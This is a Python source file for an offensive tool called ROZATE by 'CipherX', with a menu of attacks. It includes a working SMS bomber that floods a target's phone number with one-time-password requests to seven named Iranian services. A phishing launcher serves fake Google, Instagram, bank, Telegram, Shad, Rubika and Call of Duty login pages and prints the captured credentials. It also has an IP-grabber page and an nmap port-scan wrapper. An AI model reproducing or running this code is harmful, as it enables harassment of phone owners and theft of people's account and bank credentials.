# -*- coding: utf-8 -*-
from __future__ import unicode_literals
import requests
from json import dumps
from time import sleep as time
from os import system as sys
import os.path
import base64
import datetime
import pyuseragents
#-> = = = [ ROZATE - v1 ] = = = <-#
open("My","w+").write("𝕮𝕴𝕻𝕳𝕰𝕽-𝖃 ↴ \n@CipherX => Rubika\n@EBLETSM => Telegram")
open(".log","+a").write(f"𝕮𝕴𝕻𝕳𝕰𝕽-𝖃 ↴ \nRun Shod Tools {datetime.datetime.now()}\n")

req = requests.session() # Session Request
platform = pyuseragents.random() # Platform Random
headers = {"content-type":"application/json","user-agent":platform} # HEADERS

def passowrd(): # Chang Password
	try:
		sys('clear')
		print("""\033[32m

 ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗      ██╗  ██╗
██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗     ╚██╗██╔╝
██║     ██║██████╔╝███████║█████╗  ██████╔╝█████╗╚███╔╝ 
██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗╚════╝██╔██╗ 
╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ██╔╝ ██╗
 ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝
                                                        
""")
		print("\033[32mROZATE \033[34m- \033[31mv1")
		new_pass = str(input("\033[32mENTER PASSWORD New \033[31m: "))
		sys("rm -rf .login.txt")
		open(".login.txt","+a").write(new_pass)
		print("\033[32mOK Chang \033[31mPASSWORD \033[36m:)")
		return internet()
	except KeyboardInterrupt:
		pass
def nmap(): # NMAP Scanner
	try:
		sys('clear')
		print("""\033[32m
███╗   ██╗███╗   ███╗ █████╗ ██████╗ 
████╗  ██║████╗ ████║██╔══██╗██╔══██╗
██╔██╗ ██║██╔████╔██║███████║██████╔╝
██║╚██╗██║██║╚██╔╝██║██╔══██║██╔═══╝ 
██║ ╚████║██║ ╚═╝ ██║██║  ██║██║     
╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝""")
		print("\033[32mROZATE \033[34m- \033[31mv1")
		ip_enter = str(input("\033[32mIP\033[31m Or \033[37mSite : "))
		info_nmap = sys(f"nmap {ip_enter} | grep 'open'")
		time(0.55)
		print(f"\033[35mopen : \033[36m{info_nmap}\v")
		enter = str(input("\033[31mReturn\033[32m Rozate.py ? Y/N :\033[36m "))
		if enter == "y" or enter == "Y":
			return index()
		if enter == "n" or enter == "N":
			exit()
	except KeyboardInterrupt:
		sys("clear")
		print("\033[36mClosed \033[32mTools \033[31m?")
		return_tools = str(input("\033[36mY\033[31m/\033[36mN \033[37m: "))
		if return_tools == "Y" or return_tools == "y":
			exit()
		elif return_tools == "n" or return_tools == "N":
			return index()
def Call():
	while True:
		if os.path.exists("site/Call/Account.txt"):
			sys("cat site/Call/Account.txt")
			sys("rm -rf site/Call/Account.txt")
		else:
			pass
def Rubika():
	while True:
		if os.path.exists("site/Rubika/Account.txt"):
			sys("cat site/Rubika/Account.txt")
			sys("rm -rf site/Rubika/Account.txt")
		else:
			pass
def Shad():
	while True:
		if os.path.exists("site/Shad/LOG/Account.txt"):
			sys("cat site/Shad/LOG/Account.txt")
			sys("rm -rf site/Shad/LOG/Account.txt")
		else:
			pass
def Telegram():
	while True:
		if os.path.exists(f"site/Telegram/info.txt"):
			sys("cat site/Telegram/info.txt")
			sys("rm -rf site/Telegram/info.txt")
		else:
			pass
def IP():
	while True:
		if os.path.exists(f"site/IP/ip.txt"):
			sys("cat site/IP/ip.txt")
			sys("rm -rf site/IP/ip.txt")
		else:
			pass
def bank():
    while True:
        if  os.path.exists(f"site/bank/bank.txt"):
        	sys(f"cat site/bank/bank.txt")
        	sys("cp site/bank/bank.txt LOG")
        	sys("cp site/bank/Farsi[Bank].txt LOG")
        	sys(f"rm -rf site/bank/bank.txt")
        	sys("rm -rf site/bank/Farsi[Bank].txt")
        else:
            pass	
def instagram():
    while True:
        if  os.path.exists(f"site/instagram/instagram.txt"):
        	sys(f"cat site/instagram/instagram.txt")
        	sys("cp site/instagram/instagram.txt LOG")
        	sys(f"rm -rf site/instagram/instagram.txt")
        else:
            pass
def google():
    while True:
        if  os.path.exists(f"site/google/google.txt"):
        	sys(f"cat site/google/google.txt")
        	sys("cp site/google/google.txt LOG")
        	sys(f"rm -rf site/google/google.txt")
        else:
            pass
def phishing():
	sys("clear")
	print("""\033[31m

 ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗      ██╗  ██╗
██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗     ╚██╗██╔╝
██║     ██║██████╔╝███████║█████╗  ██████╔╝█████╗╚███╔╝ 
██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗╚════╝██╔██╗ 
╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ██╔╝ ██╗
 ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝
 \n\033[0m                                                      
			""")
	print("""
\033[32m [1] \033[31m Google\n
\033[32m [2] \033[31m Instagram\n
\033[32m [3] \033[31m VIP [ \033[37mBANK Phishing \033[31m]\n
\033[32m [4] \033[31m IP Target\n
\033[32m [5] \033[31m Telegram\n
\033[32m [6] \033[31m Shad\n
\033[32m [7] \033[31m Rubika\n
\033[32m [8] \033[31m Call Of Duty\n
\033[31m [00] \033[32m Back Menu
""")
	opt = input(str("\033[31m Enter :\033[37m "))
	if opt == "00" or opt == "0":
		return index()
	if opt == "1":
		sys("clear")
		try:
			port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
			sys(f"php -S 127.0.0.1:{port} -t site/google > /dev/null 2>&1 & sleep 2")
			print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
			print("\033[35m<=========>\n\033[0m")
			google()
		except:
			sys("killall php")		
	if opt == "7":
		sys("clear")
		try:
			port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
			sys(f"php -S 127.0.0.1:{port} -t site/Rubika > /dev/null 2>&1 & sleep 2")
			print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
			print("\033[35m<=========>\n\033[0m")
			Rubika()
		except:
			sys("killall php")	
	if opt == "8":
		sys("clear")
		try:
			port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
			sys(f"php -S 127.0.0.1:{port} -t site/Call > /dev/null 2>&1 & sleep 2")
			print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
			print("\033[35m<=========>\n\033[0m")
			Call()
		except:
			pass	
	if opt == "2":
		sys("clear")
		try:
			port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
			sys(f"php -S 127.0.0.1:{port} -t site/instagram > /dev/null 2>&1 & sleep 2")
			print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
			print("\033[35m<=========>\n\033[0m")
			instagram()
		except:
			sys("killall php")
	if opt == "5":
		sys("clear")
		try:
			port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
			sys(f"php -S 127.0.0.1:{port} -t site/Telegram > /dev/null 2>&1 & sleep 2")
			print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
			print("\033[35m<=========>\n\033[0m")
			Telegram()
		except: pass
	if opt == "6":
		sys("clear")
		try:
			port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
			sys(f"php -S 127.0.0.1:{port} -t site/Shad > /dev/null 2>&1 & sleep 2")
			print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
			print("\033[35m<=========>\n\033[0m")
			Shad()
		except: pass
	if opt == "4":
		sys("clear")
		try:
			port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
			sys(f"php -S 127.0.0.1:{port} -t site/IP > /dev/null 2>&1 & sleep 2")
			print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
			print("\033[35m<=========>\n\033[0m")
			IP()
		except:
			pass			 
	if opt == "3":
		sys("clear")
		key = str(input("\033[32m KEY : \033[37m"))
		if key == open("site/Dont").read():
			try:
				port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
				sys(f"php -S 127.0.0.1:{port} -t site/bank > /dev/null 2>&1 & sleep 2")
				print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
				print("\033[35m<=========>\n\033[0m")
				bank()
			except:
				sys("killall php")
		else:
			time(2)
			sys("clear")
			print("""\033[31m

 ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗      ██╗  ██╗
██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗     ╚██╗██╔╝
██║     ██║██████╔╝███████║█████╗  ██████╔╝█████╗╚███╔╝ 
██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗╚════╝██╔██╗ 
╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ██╔╝ ██╗
 ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝
 \n\033[0m\n\033[32mThe \033[31mkey \033[32mis wrong!                                                      
			""")			
def spam(): # SPAM SMS Bomber
	try:
		sys('clear')
		print("""\033[31m

███████╗███╗   ███╗███████╗
██╔════╝████╗ ████║██╔════╝
███████╗██╔████╔██║███████╗
╚════██║██║╚██╔╝██║╚════██║
███████║██║ ╚═╝ ██║███████║
╚══════╝╚═╝     ╚═╝╚══════╝
                           
""")
		print("\033[32mROZATE \033[34m- \033[31mv1")
		number_spam = str(input("\033[32mNUMBER \033[31m(912******) : "))
		tedad = int(input("\033[32mSize SEND \033[31m( 1 - 100 ) : "))
		if tedad > 100:
			sys("clear")
			print("\033[31mERROR \033[32m100 Be Pain Vard Koned :)")
			time(2)
			return spam()
		else:
			for i in range(int(tedad)):
				print(f"\033[37mSEND Message Team \033[33m{i}\033[37m Ta\033[33m {tedad}")
				time(4)
				req.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",headers=headers,data=dumps({"cellphone": f"+98{number_spam}"}).encode())
				print("\033[32mSEND SMS # \033[31mSNAP")
				time(4)
				req.post("https://api.divar.ir/v5/auth/authenticate",headers=headers,data=dumps({"phone": f'0{number_spam}'}))
				print("\033[32mSEND SMS # \033[31mDivar")
				time(4)
				req.post("https://www.sheypoor.com/api/v10.0.0/auth/send",headers=headers,data=dumps({"username":"0"+number_spam}))
				print("\033[32mSEND SMS # \033[31msheypoor")
				time(4)
				req.post("https://app.snapp-box.com/api/v2/auth/otp/send",headers=headers,data=dumps({"phoneNumber": "0"+number_spam}))
				print("\033[32mSEND SMS # \033[31mSNAP BOX")
				time(4)
				req.post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",headers=headers,data=dumps({"UserName":"+98"+number_spam}).encode())
				print("\033[32mSEND SMS # \033[31mNMAVA")
				time(4)
				req.post("https://api.toopmarket.com/api/v1/auth/login/number",headers=headers,data=dumps({"mobile":"0"+number_spam}))
				print("\033[32mSEND SMS # \033[31mToop Market")
				time(4)
				req.post("https://www.filimo.com/api/fa/v1/user/Authenticate/country_code",headers=headers,data=dumps({"mobile":"0"+number_spam,"guid":"ADB3488E-E512-E311-42FF-7EE1DE87F4FA"}).encode())
				print("\033[32mSEND SMS # \033[31mFilimo")
		sys("clear")
		print("\033[32mreturn SMS \033[31m? \033[32my/\033[32mn\n")
		enter_y_n = str(input("\033[32mENTER\033[31m #> "))
		if enter_y_n == "y" or enter_y_n == "Y":
			spam()
		elif enter_y_n == "n" or enter_y_n == "N":
			index()
		else:
			sys("clear")
			print("\033[32mROZATE \033[34m- \033[31mv1")
			print("\033[32mENTER ERROR \033[31m!")
			return index()
	except KeyboardInterrupt: # Closed App or No
		sys("clear")
		print("\033[36mClosed \033[32mTools \033[31m?")
		return_tools = str(input("\033[36mY\033[31m/\033[36mN \033[37m: "))
		if return_tools == "Y" or return_tools == "y":
			exit()
		elif return_tools == "n" or return_tools == "N":
			return index()
def index():
	try:
		sys("clear")
		print("""\033[32m

 ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗      ██╗  ██╗
██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗     ╚██╗██╔╝
██║     ██║██████╔╝███████║█████╗  ██████╔╝█████╗╚███╔╝ 
██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗╚════╝██╔██╗ 
╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ██╔╝ ██╗
 ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝
                                                        
""")	
		print("""
\033[32m[1] \033[31m-> \033[37mSMS Bomber
\033[32m[2] \033[31m-> \033[37mPassWord Change
\033[32m[3] \033[31m-> \033[37mNmap Scanner
\033[32m[4] \033[31m-> \033[37mPhishinges
\033[32m[0] \033[31m-> \033[37mEXIT
""")
		Enter = str(input("\033[32m#\033[31m> "))
		if Enter == "1":
			spam()
		if Enter == "2":
			passowrd()
		if Enter == "3":
			nmap()
		if Enter == "4":
			phishing()
		if Enter == "0" or Enter == "00":
			sys("clear")
			print("\033[31mCIPHER \033[37m- \033[32mX")
			exit()
		else:
			print("\033[32mCommand Not Find\033[31m !")
			time(0.99)
			return index()

	except KeyboardInterrupt:
		sys("clear")
		print("\033[36mClosed \033[32mTools \033[31m?")
		return_tools = str(input("\033[36mY\033[31m/\033[36mN \033[37m: "))
		if return_tools == "Y" or return_tools == "y":
			exit()
		elif return_tools == "n" or return_tools == "N":
			return internet()
def check():
	try:
		check = os.path.isfile(r'.login.txt')
		if check == True:
			sys("clear")
			print("\033[32mROZATE \033[34m- \033[31mv1\n\n\033[37m[\033[32m LOGIN\033[37m ]\n")
			password_Login = str(input("\033[32mPASSWORD\033[31m : "))
			if password_Login == open(".login.txt").read():
				index()
			else:
				sys('clear')
				time(0.77)
				print("""\033[31m
██████╗  █████╗ ███████╗███████╗
██╔══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝███████║███████╗███████╗
██╔═══╝ ██╔══██║╚════██║╚════██║
██║     ██║  ██║███████║███████║
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
""")
				print("\033[32mROZATE \033[34m- \033[31mv1\n")
				print("\033[32mPassWord Not Find\033[31m!")
				time(0.72)
				return internet()
		if check == False:
			sys('clear')
			print("""\033[32m 
██████╗  █████╗ ███████╗███████╗
██╔══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝███████║███████╗███████╗
██╔═══╝ ██╔══██║╚════██║╚════██║
██║     ██║  ██║███████║███████║
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
""")
			print("\033[32mROZATE \033[34m- \033[31mv1\n")
			password_new = str(input("\033[32mEnter Password New \033[31m: "))	
			open(".login.txt","+a").write(password_new)
			time(1)
			index()
	except KeyboardInterrupt:
		pass
def internet():
	try:
		send_check = requests.post("https://time.ir").status_code
		try:
			if send_check == 200:
				check()
			else:
				sys("clear")
				print("\033[32mYour Internet Not \033[31mConnected\n\n\033[32mCtrl \033[31m+\033[32m X\nSTATUS : \033[34m{}".format(send_check))
				time(2)
				return internet()
		except requests.exceptions.ConnectionError:
			sys("clear")
			print("""\033[31m

 ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗      ██╗  ██╗
██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗     ╚██╗██╔╝
██║     ██║██████╔╝███████║█████╗  ██████╔╝█████╗╚███╔╝ 
██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗╚════╝██╔██╗ 
╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ██╔╝ ██╗
 ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝
\033[32m\nError Internet\033[31m!                                                        
			""")
	except KeyboardInterrupt:
		pass
internet()
